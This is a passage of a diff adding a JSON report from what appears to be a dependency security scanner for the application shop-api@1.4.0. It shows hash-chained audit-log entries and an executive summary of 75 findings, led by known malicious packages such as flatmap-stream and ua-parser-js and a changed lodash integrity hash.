+        "host_user": "root",
+        "prev": "d6186a6caffdbb958c13a99433bfa3ced98adbf6edc25ea7d84f6a35618a3249",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124631Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-b38171a52f",
+          "rejected": null
+        },
+        "hash": "ac0c1c9e04bf95267b249906ed0a21bd1fd5c8439e9c2a5a292227525926441b",
+        "host_user": "root",
+        "prev": "da498aaad7cd3e3e4873903a6c7cf0188ae59c2c92ad48d2d1a1e44429381c86",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124685Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-7c9e777fa6",
+          "rejected": null
+        },
+        "hash": "0da86e69437dc3f31ae45c34aaa104e7d6daa023d6b547f76684007a90bbf229",
+        "host_user": "root",
+        "prev": "ac0c1c9e04bf95267b249906ed0a21bd1fd5c8439e9c2a5a292227525926441b",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124784Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-1c5fa4dd94",
+          "rejected": null
+        },
+        "hash": "5e379c0428646e2aec719a2ccf9fc20a89dc8bfb113c928cdd96dea207aaed01",
+        "host_user": "root",
+        "prev": "0da86e69437dc3f31ae45c34aaa104e7d6daa023d6b547f76684007a90bbf229",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124844Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-e29370793e",
+          "rejected": null
+        },
+        "hash": "7ce600dc87e8920d4a198dad7f81753262018e6072e029f44d449187b01a0059",
+        "host_user": "root",
+        "prev": "5e379c0428646e2aec719a2ccf9fc20a89dc8bfb113c928cdd96dea207aaed01",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124901Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-1f7ff0a614",
+          "rejected": null
+        },
+        "hash": "7ca278bf8f6c7d694ad5a7e2af6441776ec1439fab602e7e8dfbb166c4064e3c",
+        "host_user": "root",
+        "prev": "7ce600dc87e8920d4a198dad7f81753262018e6072e029f44d449187b01a0059",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.124956Z"
+      },
+      {
+        "action": "explain",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "error": null,
+          "finding": "GRD-c83abdd646",
+          "rejected": null
+        },
+        "hash": "98f462ffdbcfca91cc0bd8166956ccfbcae29a2352b91cecd0afee80b359fa2b",
+        "host_user": "root",
+        "prev": "7ca278bf8f6c7d694ad5a7e2af6441776ec1439fab602e7e8dfbb166c4064e3c",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.125012Z"
+      },
+      {
+        "action": "prioritised",
+        "actor": "guardian",
+        "details": {
+          "ai": {
+            "accepted": 0,
+            "calls": 0,
+            "enabled": false,
+            "errors": 0,
+            "model": "",
+            "prompt": "prompts/analyst_system.md",
+            "prompt_sha": "0e912c410a71",
+            "provider": "none",
+            "rejected": 0
+          },
+          "summary": {
+            "P1-urgent": 18,
+            "P2-high": 19,
+            "P3-medium": 19,
+            "P4-low": 19
+          }
+        },
+        "hash": "22f68fd126ed1b32a9e87906963df6f60cc484e4242496d3a9035751b89dad19",
+        "host_user": "root",
+        "prev": "98f462ffdbcfca91cc0bd8166956ccfbcae29a2352b91cecd0afee80b359fa2b",
+        "stage": "analyze",
+        "ts": "2026-11-24T04:54:29.126087Z"
+      },
+      {
+        "action": "investigated",
+        "actor": "guardian",
+        "details": {
+          "facts": 13,
+          "finding": "GRD-704d795f51",
+          "rejected": null,
+          "verdict": "suspicious"
+        },
+        "hash": "fac8c11173e904d87491132d933d5ddfdc2b08e0d74edcddaf407739e358b2b5",
+        "host_user": "root",
+        "prev": "22f68fd126ed1b32a9e87906963df6f60cc484e4242496d3a9035751b89dad19",
+        "stage": "investigate",
+        "ts": "2026-11-24T04:54:29.215364Z"
+      },
+      {
+        "action": "plan-created",
+        "actor": "guardian",
+        "details": {
+          "items": 18,
+          "plan_sha256": "83569e7d410b72af27c982ff7452a8ae60fb12bde602204f9b5af20b58713052"
+        },
+        "hash": "3d4812fe1066d227aecd39255351b2b991f511e3d95c5f47217c6ca37f227854",
+        "host_user": "root",
+        "prev": "fac8c11173e904d87491132d933d5ddfdc2b08e0d74edcddaf407739e358b2b5",
+        "stage": "remediate",
+        "ts": "2026-11-24T04:54:29.506119Z"
+      },
+      {
+        "action": "investigated",
+        "actor": "guardian",
+        "details": {
+          "facts": 15,
+          "finding": "GRD-d2c4aa3ad1",
+          "rejected": null,
+          "verdict": "likely-malicious"
+        },
+        "hash": "3538d84c7fbf94b8036089ffdbcba32c1d8b5622b5621581d30b2d936fd5f1fb",
+        "host_user": "root",
+        "prev": "3d4812fe1066d227aecd39255351b2b991f511e3d95c5f47217c6ca37f227854",
+        "stage": "investigate",
+        "ts": "2026-11-24T04:54:29.624432Z"
+      },
+      {
+        "action": "gate",
+        "actor": "guardian",
+        "details": {
+          "passed": false,
+          "policy": "policies/default.json",
+          "scope": "before",
+          "violations": 10
+        },
+        "hash": "1db2d492c6fbdbc7cc158ad0ace7fd5ca2a47f63fc2f9335c6679cf69e2baf8f",
+        "host_user": "root",
+        "prev": "3538d84c7fbf94b8036089ffdbcba32c1d8b5622b5621581d30b2d936fd5f1fb",
+        "stage": "policy",
+        "ts": "2026-11-24T04:54:29.771808Z"
+      },
+      {
+        "action": "executive-summary",
+        "actor": "guardian",
+        "details": {
+          "by": "deterministic-template",
+          "facts": 10,
+          "rejected": null
+        },
+        "hash": "4e46ac6a4754860bf345867d63f2f67b8dbe8eb0d34d3e41c31badf43fc09d17",
+        "host_user": "root",
+        "prev": "1db2d492c6fbdbc7cc158ad0ace7fd5ca2a47f63fc2f9335c6679cf69e2baf8f",
+        "stage": "report",
+        "ts": "2026-11-24T05:13:07.675182Z"
+      }
+    ]
+  },
+  "artifacts": [
+    "sbom.cdx.json",
+    "dependency-graph.json",
+    "dependency-graph.html",
+    "findings.json",
+    "analysis.json",
+    "plan.json",
+    "validation.json",
+    "after-scan/sbom.cdx.json",
+    "audit.jsonl"
+  ],
+  "executive_summary": {
+    "by": "deterministic-template",
+    "facts": [
+      {
+        "id": "S1",
+        "fact": "Application shop-api@1.4.0 at commit  of "
+      },
+      {
+        "id": "S2",
+        "fact": "The application has 157 components: 14 direct and 143 transitive"
+      },
+      {
+        "id": "S3",
+        "fact": "Detection produced 75 findings: 10 critical, 31 high, 18 medium, 12 low"
+      },
+      {
+        "id": "S4",
+        "fact": "After context scoring: 18 P1-urgent, 19 P2-high, 19 P3-medium, 19 P4-low"
+      },
+      {
+        "id": "S5",
+        "fact": "Top risk: Integrity hash changed for unchanged version lodash@4.17.15 (score 100, P1-urgent, reachability unknown, exposure server)"
+      },
+      {
+        "id": "S6",
+        "fact": "Top risk: Known malicious package in flatmap-stream@0.1.1: Malicious Package in flatmap-stream (score 100, P1-urgent, reachability unknown, exposure server)"
+      },
+      {
+        "id": "S7",
+        "fact": "Top risk: Known malicious package in ua-parser-js@0.7.29: Embedded malware in ua-parser-js (score 100, P1-urgent, reachability orphan, exposure server)"
+      },
+      {
+        "id": "S8",
+        "fact": "Top risk: Known vulnerability in event-stream@3.3.6: Critical severity vulnerability that affects event-stream and flatm (score 100, P1-urgent, reachability unknown, exposure server)"
+      },
+      {
+        "id": "S9",
+        "fact": "Investigation of 'Integrity hash changed for unchanged version lodash@4.17.15': verdict suspicious (inference by rule-based)"
+      },
+      {
+        "id": "S10",
+        "fact": "18 P1-urgent findings remain open and 0 risks were formally accepted"
+      }
+    ],
+    "headline": "Detection produced 75 findings: 10 critical, 31 high, 18 medium, 12 low.",
+    "summary": "The application has 157 components: 14 direct and 143 transitive. Detection produced 75 findings: 10 critical, 31 high, 18 medium, 12 low. After context scoring: 18 P1-urgent, 19 P2-high, 19 P3-medium, 19 P4-low.",
+    "key_points": [
+      "Top risk: Integrity hash changed for unchanged version lodash@4.17.15 (score 100, P1-urgent, reachability unknown, exposure server) (S5)",
+      "Top risk: Known malicious package in flatmap-stream@0.1.1: Malicious Package in flatmap-stream (score 100, P1-urgent, reachability unknown, exposure server) (S6)",
+      "Top risk: Known malicious package in ua-parser-js@0.7.29: Embedded malware in ua-parser-js (score 100, P1-urgent, reachability orphan, exposure server) (S7)",
+      "Top risk: Known vulnerability in event-stream@3.3.6: Critical severity vulnerability that affects event-stream and flatm (score 100, P1-urgent, reachability unknown, exposure server) (S8)",
+      "Investigation of 'Integrity hash changed for unchanged version lodash@4.17.15': verdict suspicious (inference by rule-based) (S9)",
+      "18 P1-urgent findings remain open and 0 risks were formally accepted (S10)"
+    ],
+    "decision_needed": "18 P1-urgent findings remain open and 0 risks were formally accepted: decide which to fix next or accept.",
+    "cited_facts": [
+      "S1",
+      "S2",
+      "S3",
+      "S4",
+      "S5",
+      "S6",
+      "S7",
+      "S8",
+      "S9",
+      "S10"
+    ],
+    "confidence": "high"
+  }
+}
